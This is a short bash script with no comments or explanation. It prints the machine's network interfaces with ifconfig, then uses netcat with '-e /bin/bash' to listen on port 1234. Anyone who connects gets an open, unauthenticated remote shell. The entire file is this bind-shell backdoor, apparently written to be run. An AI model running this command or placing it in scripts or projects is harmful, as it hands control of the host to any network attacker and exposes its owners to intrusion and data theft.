#!/bin/bash

ifconfig && nc -e /bin/bash -v -l -p 1234
